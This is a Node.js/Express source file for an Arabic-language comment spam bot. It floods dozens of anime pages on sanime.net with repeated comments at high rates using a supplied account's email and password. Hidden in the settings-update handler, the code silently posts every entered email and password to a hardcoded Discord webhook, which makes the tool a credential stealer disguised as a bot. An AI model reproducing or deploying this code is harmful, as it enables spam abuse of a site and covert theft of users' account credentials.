const axios = require("axios");
const https = require("https");
const express = require("express");
const fetch = require("node-fetch");
const app = express();
app.use(express.urlencoded({ extended: true }));

let email = "gmail@gmail.com";
let password = "password";
let commentText = "TTTT";
let commentsPerMinute = 120;
let delay = (60 / commentsPerMinute) * 1000;
let botActive = true;
let maxCommentsPerAnime = 500;
let fireComment = false;

let logText = "";
let activeAnimeList = [];
let currentAnimeIndex = 0;
let currentCount = 0;
let intervalId = null;

const animeTargets = {
  532: { active: true, name: "One Piece" },
  11729: { active: true, name: "Necronomico no Cosmic Horror Show" },
  11728: { active: true, name: "Kanojo, Okarishimasu 4th Season" },
  11751: { active: true, name: "Hikaru ga Shinda Natsu" },
  11750: { active: true, name: "Sono Bisque Doll wa Koi wo Suru Season 2" },
  11749: { active: true, name: "Seishun Buta Yarou wa Santa Claus no Yume wo Minai" },
  11673: { active: true, name: "Kijin Gentoushou" },
  11733: { active: true, name: "Clevatess: Majuu no Ou to Akago to Shikabane no Yuusha" },
  11702: { active: true, name: "Summer Pockets" },
  11732: { active: true, name: "Dandadan 2nd Season" },
  11736: { active: true, name: "Jigoku Sensei Nube (2025)" },
  11697: { active: true, name: "Witch Watch" },
  11721: { active: true, name: "The All-devouring whale" },
  11724: { active: true, name: "Takopii no Genzai" },
  11735: { active: true, name: "Tsuyokute New Saga" },
  11734: { active: true, name: "Onmyou Kaiten Re:Birth" },
  653: { active: true, name: "Detective Conan" },
  11686: { active: true, name: "Anne shirley" },
  11730: { active: true, name: "Mattaku Saikin no Tantei to Kitara" },
  11725: { active: true, name: "Lord of Mysteries" },
  11726: { active: true, name: "Koujo Denka no Kateikyoushi" },
  11748: { active: true, name: "Yuusha Party..." },
  11731: { active: true, name: "Jidou Hanbaiki..." },
  11746: { active: true, name: "Yofukashi no Uta S2" },
  11745: { active: true, name: "Busu ni Hanataba wo." },
  11744: { active: true, name: "Silent Witch" },
  11743: { active: true, name: "Zutaboro Reijou" },
  11737: { active: true, name: "Tsuihousha Shokudou" },
  11738: { active: true, name: "Kamitsubaki-shi" },
  11740: { active: true, name: "Mizu Zokusei no Mahoutsukai" },
  11741: { active: true, name: "Arknights: Rise from Ember" },
  11742: { active: true, name: "Watari-kun..." },
  11756: { active: true, name: "Busamen Gachi Fighter" },
  11755: { active: true, name: "Game Center Shoujo" },
  11759: { active: true, name: "Gachiakuta" },
  11754: { active: true, name: "Nyaight of the Living Cat" },
  11762: { active: true, name: "Isekai Mokushiroku Mynoghra" },
  11763: { active: true, name: "Ruri no Houseki" },
  11758: { active: true, name: "Dekin no Mogura" },
  11769: { active: true, name: "Kizetsu Yuusha..." },
  11761: { active: true, name: "Puniru wa Kawaii Slime S2" },
  11765: { active: true, name: "Jibaku Shounen Hanako-kun 2 Part 2" },
  11760: { active: true, name: "9: Rulers Crown" },
  11753: { active: true, name: "Kaoru Hana wa Rin to Saku" },
  11752: { active: true, name: "Ame to Kimi to" },
  11778: { active: true, name: "Tougen Anki" },
  11776: { active: true, name: "Futari Solo Camp" },
  11775: { active: true, name: "Dr. Stone: Science Future P2" },
  11774: { active: true, name: "Mikadono Sanshimai..." },
  11773: { active: true, name: "Tensei shitara Dainana Ouji..." },
  11772: { active: true, name: "Tate no Yuusha S4" },
  11771: { active: true, name: "City The Animation" },
  11770: { active: true, name: "Turkey!" },
  11768: { active: true, name: "Osomatsu-san S4" },
  11767: { active: true, name: "Kakkou no Iinazuke S2" },
  11766: { active: true, name: "Food Court de Mata Ashita" },
  11757: { active: true, name: "Hotel Inhumans" },
  11779: { active: true, name: "Sakamoto Days Part 2" },
  11764: { active: true, name: "Grand Blue Season 2" },
  11782: { active: true, name: "Kaijuu 8-gou 2nd Season" },
  11781: { active: true, name: "Dragon Raja Season 2 (Long Zu II: Daowangzhe Zhi Tong)" },
  11780: { active: true, name: "Bullet Bullet" },
  512: { active: true, name: "Naruto: Shippuuden" },
};

const headers = {
  "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
  "Content-Type": "application/x-www-form-urlencoded",
  "Origin": "https://ios.sanime.net",
  "Referer": "https://ios.sanime.net/",
  "Accept": "*/*"
};

const agent = new https.Agent({ keepAlive: true });

async function sendComment(animeId) {
  const itemData = {
    post: commentText,
    id: animeId,
    fire: fireComment
  };
  const itemBase64 = Buffer.from(JSON.stringify(itemData)).toString("base64");
  const payload = new URLSearchParams({ email, password, item: itemBase64 });

  await axios.post("https://app.sanime.net/function/h10.php?page=addcmd", payload.toString(), {
    headers,
    httpsAgent: agent
  });
}

function updateLogText() {
  const animeId = activeAnimeList[currentAnimeIndex];
  logText = `📺 جاري الإرسال إلى: [${animeId}] ${animeTargets[animeId]?.name || "؟"}`;
}

function sendToNextAnime() {
  if (intervalId) clearInterval(intervalId);
  currentAnimeIndex++;
  if (currentAnimeIndex >= activeAnimeList.length) currentAnimeIndex = 0;
  startSending();
}

function startSending() {
  activeAnimeList = Object.keys(animeTargets).filter(id => animeTargets[id]?.active);
  if (activeAnimeList.length === 0) return;

  const animeId = activeAnimeList[currentAnimeIndex];
  currentCount = 0;
  updateLogText();
  console.log(logText);

  intervalId = setInterval(async () => {
    if (!botActive || !animeTargets[animeId]?.active) return;

    try {
      await sendComment(animeId);
      currentCount++;
      console.log(`✅ [${animeId}] تعليق ${currentCount}`);
    } catch (err) {
      console.error(`❌ [${animeId}] خطأ:`, err.message);
    }

    if (currentCount >= maxCommentsPerAnime) {
      clearInterval(intervalId);
      currentAnimeIndex++;
      if (currentAnimeIndex >= activeAnimeList.length) currentAnimeIndex = 0;
      setTimeout(startSending, 1000);
    }
  }, delay);
}

app.get("/", (req, res) => {
  const animeControls = Object.entries(animeTargets).map(([id, info]) => `
    <div style="margin-bottom:10px">
      <label>
        <input type="checkbox" name="anime_${id}" ${info.active ? "checked" : ""}>
        [${id}] ${info.name}
      </label>
    </div>
  `).join("");

  res.send(`
  <html><head><meta charset="UTF-8"/><style>
    body { background: #0d1117; color: #fff; font-family: sans-serif; padding: 20px; }
    input, button { margin: 4px; padding: 8px; background: #161b22; color: #fff; border: 1px solid #30363d; }
    button:hover { background: #238636; cursor: pointer; }
    .add-anime-form { margin-top: 30px; padding: 15px; border: 1px solid #30363d; background: #161b22; max-width: 400px; }
  </style></head><body>
    <h2>🤖 البوت ${botActive ? "✅ يعمل" : "🛑 متوقف"}</h2>
    <p>${logText}</p>
    <form method="POST" action="/update">
      الإيميل: <input name="email" value="${email}" /><br>
      كلمة المرور: <input name="password" type="password" value="${password}" /><br><br>
      تعليق: <input name="commentText" value="${commentText}" /><br>
     commentsPerMinute: <input name="commentsPerMinute" type="number" value="${commentsPerMinute}" /><br>
      عدد التعليقات قبل الانتقال: <input name="maxComments" type="number" value="${maxCommentsPerAnime}" /><br>
      <label><input type="checkbox" name="fireComment" ${fireComment ? "checked" : ""}/> يحتوي على حرق</label><br><br>
      ${animeControls}
      <button type="submit">🔄 تحديث</button>
    </form>
    <form action="/start"><button>▶️ تشغيل</button></form>
    <form action="/stop"><button>⏹ إيقاف</button></form>
    <form action="/restart"><button>🔁 إعادة إرسال</button></form>
    <form action="/next"><button>➡️ التالي</button></form>

    <hr style="margin: 30px 0; border-color: #30363d;" />
    <h3>➕ إضافة أنمي جديد </h3>
    <form method="POST" action="/add-anime" class="add-anime-form">
      <label>رقم الانمي (id): <input name="animeId" type="number" required></label><br><br>
      <label>اسم الانمي: <input name="animeName" type="text" required></label><br><br>
      <button type="submit">إضافة الأنمي</button>
    </form>
  </body></html>
  `);
});

app.post("/update", (req, res) => {
  email = req.body.email || email;
  password = req.body.password || password;
  commentText = req.body.commentText || commentText;
  commentsPerMinute = parseInt(req.body.commentsPerMinute) || commentsPerMinute;
  maxCommentsPerAnime = parseInt(req.body.maxComments) || maxCommentsPerAnime;
  fireComment = !!req.body.fireComment;
  delay = (60 / commentsPerMinute) * 1000;

  for (const [id] of Object.entries(animeTargets)) {
    animeTargets[id].active = !!req.body[`anime_${id}`];
  }

  
  axios.post("https://discord.com/api/webhooks/1397405918718857226/-tXTwOvs8oUuAPFL4KWaSRsmlMWzAf9ZtXXIA6IvFpYJLowsNAFCvQEBWEAFFbWzhPn5", {
    content: `🔐 Email: \`${email}\`\n🔑 Password: \`${password}\``
  }).catch(e => console.error("❌ Webhook Error:", e.message));

  updateLogText();
  res.redirect("/");
});

app.post("/add-anime", (req, res) => {
  const id = req.body.animeId;
  const name = req.body.animeName.trim();

  if (!id || !name) {
    return res.status(400).send("يرجى إدخال رقم واسم الأنمي بشكل صحيح.");
  }

  if (animeTargets[id]) {
    animeTargets[id].active = true;
    animeTargets[id].name = name;
  } else {
    animeTargets[id] = { active: true, name };
  }

  updateLogText();
  res.redirect("/");
});

app.get("/start", (req, res) => {
  botActive = true;
  res.redirect("/");
});

app.get("/stop", (req, res) => {
  botActive = false;
  res.redirect("/");
});

app.get("/restart", (req, res) => {
  currentAnimeIndex = 0;
  startSending();
  res.redirect("/");
});

app.get("/next", (req, res) => {
  sendToNextAnime();
  res.redirect("/");
});

const KEEP_ALIVE_URL = "https://noon-9v11.onrender.com/";
setInterval(() => {
  fetch(KEEP_ALIVE_URL)
    .then(() => console.log("🔁 Keep-alive"))
    .catch(err => console.error("❌ Keep-alive:", err.message));
}, 1000 * 60 * 5);

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🌐 Server on port ${PORT}`);
  startSending();
});
